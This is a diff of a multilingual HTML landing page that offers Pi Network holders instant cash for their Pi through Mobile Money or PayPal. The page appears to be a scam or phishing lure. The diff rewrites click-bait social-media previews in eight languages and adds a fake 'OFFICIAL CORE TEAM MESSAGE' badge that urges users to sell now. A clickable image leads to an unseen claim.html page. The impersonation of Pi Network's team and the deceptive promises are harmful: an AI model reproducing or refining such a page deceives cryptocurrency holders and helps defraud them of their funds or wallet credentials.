@@ -1,13 +1,13 @@
-k<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Pi Network - Retrait Immédiat, Recevez Cash Instantané!</title>
+    <title>Pi Network - Vendez Maintenant, Recevez Cash Instantané!</title>
     
     <!-- Balises Open Graph dynamiques -->
-    <meta property="og:title" content="Pi Network - Retrait Immédiat, Recevez Cash Instantané!">
-    <meta property="og:description" content="🚀 TRANSFORMEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal. Taux avantageux ⚡ Cliquez pour retirer!">
+    <meta property="og:title" content="Pi Network - Vendez Maintenant, Recevez Cash Instantané!">
+    <meta property="og:description" content="🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal. Taux avantageux ⚡ Cliquez pour vendre!">
     <meta property="og:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -20,8 +20,8 @@ k<!DOCTYPE html>
     
     <!-- Balises Twitter -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Pi Network - Retrait Immédiat, Recevez Cash Instantané!">
-    <meta name="twitter:description" content="🚀 TRANSFORMEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT ⚡ Cliquez pour retirer!">
+    <meta name="twitter:title" content="Pi Network - Vendez Maintenant, Recevez Cash Instantané!">
+    <meta name="twitter:description" content="🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT ⚡ Cliquez pour vendre!">
     <meta name="twitter:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
 
     <style>
@@ -89,6 +89,30 @@ k<!DOCTYPE html>
             height: 630px;
             object-fit: contain;
         }
+        
+        /* Style pour le message de la Core Team */
+        .core-team-message {
+            background: linear-gradient(135deg, #1a5276, #2e86c1);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            border-radius: 10px;
+            margin: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        .core-team-badge {
+            display: inline-block;
+            background: #f39c12;
+            color: #000;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-size: 12px;
+            margin-bottom: 8px;
+        }
     </style>
 </head>
 <body>
@@ -96,20 +120,22 @@ k<!DOCTYPE html>
     <div class="facebook-section" id="facebookPreview" aria-hidden="true">
         <img class="facebook-image" 
              src="https://i.postimg.cc/3x0Nrn1p/Go-2.png" 
-             alt="RETRAIT PI - Recevez CASH Immédiatement!"
+             alt="VENDEZ PI - Recevez CASH Immédiatement!"
              id="ogImage">
     </div>
+    
+  
     
     <!-- Image principale cliquable -->
     <img class="main-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
-         alt="CLIQUEZ ICI pour RETIRER vos Pi - Argent Immédiat!" 
+         alt="CLIQUEZ ICI pour VENDRE vos Pi - Argent Immédiat!" 
          onclick="window.location.href='claim.html'">
     
     <!-- Image de continuation -->
     <img class="continuation-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
-         alt="Plateforme de retrait Pi - Retrait Instantané">
+         alt="Plateforme de vente Pi - Retrait Instantané">
     
     <!-- Pied de page fixe -->
     <footer class="footer">
@@ -121,44 +147,44 @@ k<!DOCTYPE html>
         // DESCRIPTIONS ULTRA-ATTRACTIVES pour maximiser les clics
         const ogTranslations = {
             en: {
-                title: "Pi Network - WITHDRAW NOW, Get INSTANT CASH!",
-                description: "🚀 TRANSFORM your Pi into REAL MONEY! INSTANT withdrawal via Mobile Money, PayPal. Best rates ⚡ Click to WITHDRAW now!",
-                imageAlt: "WITHDRAW PI - Get INSTANT CASH Now!"
+                title: "Pi Network - SELL NOW, Get INSTANT CASH!",
+                description: "🚀 SELL your Pi for REAL MONEY! INSTANT withdrawal via Mobile Money, PayPal. Best rates ⚡ Click to SELL now!",
+                imageAlt: "SELL PI - Get INSTANT CASH Now!"
             },
             fr: {
-                title: "Pi Network - Retrait Immédiat, Recevez Cash Instantané!",
-                description: "🚀 TRANSFORMEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal. Taux avantageux ⚡ Cliquez pour retirer!",
-                imageAlt: "RETRAIT PI - Recevez CASH Immédiatement!"
+                title: "Pi Network - Vendez Maintenant, Recevez Cash Instantané!",
+                description: "🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal. Taux avantageux ⚡ Cliquez pour vendre!",
+                imageAlt: "VENDEZ PI - Recevez CASH Immédiatement!"
             },
             es: {
-                title: "Pi Network - ¡Retira YA, Recibe Efectivo INMEDIATO!",
-                description: "🚀 ¡TRANSFORMA tus Pi en DINERO REAL! Retiro INMEDIATO vía Mobile Money, PayPal. Mejores tasas ⚡ ¡Haz clic para RETIRAR!",
-                imageAlt: "RETIRAR PI - ¡Recibe EFECTIVO Inmediato!"
+                title: "Pi Network - ¡Vende YA, Recibe Efectivo INMEDIATO!",
+                description: "🚀 ¡VENDE tus Pi por DINERO REAL! Retiro INMEDIATO vía Mobile Money, PayPal. Mejores tasas ⚡ ¡Haz clic para VENDER!",
+                imageAlt: "VENDER PI - ¡Recibe EFECTIVO Inmediato!"
             },
             de: {
-                title: "Pi Network - JETZT Abheben, Sofort BARGELD!",
-                description: "🚀 VERWANDELN Sie Ihre Pi in ECHTES GELD! SOFORTIGE Auszahlung per Mobile Money, PayPal. Beste Kurse ⚡ Jetzt abheben!",
-                imageAlt: "PI AUSZAHLEN - Sofort BARGELD erhalten!"
+                title: "Pi Network - JETZT Verkaufen, Sofort BARGELD!",
+                description: "🚀 VERKAUFEN Sie Ihre Pi für ECHTES GELD! SOFORTIGE Auszahlung per Mobile Money, PayPal. Beste Kurse ⚡ Jetzt verkaufen!",
+                imageAlt: "PI VERKAUFEN - Sofort BARGELD erhalten!"
             },
             ar: {
-                title: "Pi Network - سحب الآن، احصل على نقدي فوري!",
-                description: "🚀 حوّل عملات Pi الخاصة بك إلى أموال حقيقية! سحب فوري عبر Mobile Money أو PayPal. أفضل الأسعار ⚡ انقر للسحب الآن!",
-                imageAlt: "سحب PI - احصل على نقدي فوري!"
+                title: "Pi Network - بِع الآن، احصل على نقدي فوري!",
+                description: "🚀 بِع عملات Pi الخاصة بك مقابل أموال حقيقية! سحب فوري عبر Mobile Money أو PayPal. أفضل الأسعار ⚡ انقر للبيع الآن!",
+                imageAlt: "بيع PI - احصل على نقدي فوري!"
             },
             pt: {
-                title: "Pi Network - Saque AGORA, Receba DINHEIRO Instantâneo!",
-                description: "🚀 TRANSFORME seus Pi em DINHEIRO REAL! Saque INSTANTÂNEO via Mobile Money, PayPal. Melhores taxas ⚡ Clique para SACAR!",
-                imageAlt: "SACAR PI - Receba DINHEIRO Imediato!"
+                title: "Pi Network - Venda AGORA, Receba DINHEIRO Instantâneo!",
+                description: "🚀 VENDA seus Pi por DINHEIRO REAL! Saque INSTANTÂNEO via Mobile Money, PayPal. Melhores taxas ⚡ Clique para VENDER!",
+                imageAlt: "VENDER PI - Receba DINHEIRO Imediato!"
             },
             ru: {
-                title: "Pi Network - Выводите СЕЙЧАС, Получите НАЛИЧНЫЕ Мгновенно!",
-                description: "🚀 ПРЕВРАТИТЕ ваши Pi в РЕАЛЬНЫЕ ДЕНЬГИ! МГНОВЕННЫЙ вывод через Mobile Money, PayPal. Лучшие курсы ⚡ Нажмите чтобы ВЫВЕСТИ!",
-                imageAlt: "ВЫВОД PI - Получите НАЛИЧНЫЕ Сразу!"
+                title: "Pi Network - Продавайте СЕЙЧАС, Получите НАЛИЧНЫЕ Мгновенно!",
+                description: "🚀 ПРОДАВАЙТЕ ваши Pi за РЕАЛЬНЫЕ ДЕНЬГИ! МГНОВЕННЫЙ вывод через Mobile Money, PayPal. Лучшие курсы ⚡ Нажмите чтобы ПРОДАТЬ!",
+                imageAlt: "ПРОДАТЬ PI - Получите НАЛИЧНЫЕ Сразу!"
             },
             zh: {
-                title: "Pi Network - 立即提现，获得即时现金！",
-                description: "🚀 将您的Pi变成真实现金！通过Mobile Money、PayPal即时提现。最优汇率 ⚡ 点击立即提现！",
-                imageAlt: "提现PI - 立即获得现金！"
+                title: "Pi Network - 立即出售，获得即时现金！",
+                description: "🚀 出售您的Pi获得真实现金！通过Mobile Money、PayPal即时提现。最优汇率 ⚡ 点击立即出售！",
+                imageAlt: "出售PI - 立即获得现金！"
             }
         };
 
@@ -220,6 +246,54 @@ k<!DOCTYPE html>
             
             // Mettre à jour le titre de la page
             document.title = translation.title;
+            
+            // Mettre à jour le message de la Core Team selon la langue
+            updateCoreTeamMessage(lang);
+        }
+
+        // Mettre à jour le message de la Core Team
+        function updateCoreTeamMessage(lang) {
+            const coreTeamMessages = {
+                en: {
+                    badge: "OFFICIAL CORE TEAM MESSAGE",
+                    text: "Sell your Pi now! Transform your Pi into cash immediately."
+                },
+                fr: {
+                    badge: "MESSAGE OFFICIEL CORE TEAM",
+                    text: "Vendez vos Pi maintenant ! Transformez vos Pi en argent comptant immédiatement."
+                },
+                es: {
+                    badge: "MENSAJE OFICIAL DEL CORE TEAM",
+                    text: "¡Vende tus Pi ahora! Transforma tus Pi en efectivo inmediatamente."
+                },
+                de: {
+                    badge: "OFFIZIELLE CORE TEAM NACHRICHT",
+                    text: "Verkaufen Sie Ihre Pi jetzt! Verwandeln Sie Ihre Pi sofort in Bargeld."
+                },
+                ar: {
+                    badge: "رسالة فريق التطوير الرسمية",
+                    text: "بع عملات Pi الخاصة بك الآن! حول Pi الخاص بك إلى نقدي فورًا."
+                },
+                pt: {
+                    badge: "MENSAGEM OFICIAL DA CORE TEAM",
+                    text: "Venda seus Pi agora! Transforme seus Pi em dinheiro imediatamente."
+                },
+                ru: {
+                    badge: "ОФИЦИАЛЬНОЕ СООБЩЕНИЕ CORE TEAM",
+                    text: "Продавайте свои Pi сейчас! Превратите свои Pi в наличные немедленно."
+                },
+                zh: {
+                    badge: "官方核心团队消息",
+                    text: "立即出售您的Pi！立即将您的Pi转换为现金。"
+                }
+            };
+            
+            const message = coreTeamMessages[lang] || coreTeamMessages.fr;
+            const badgeElement = document.querySelector('.core-team-badge');
+            const textElement = document.querySelector('.core-team-message div:last-child');
+            
+            if (badgeElement) badgeElement.textContent = message.badge;
+            if (textElement) textElement.textContent = message.text;
         }
 
         // Obtenir le code locale
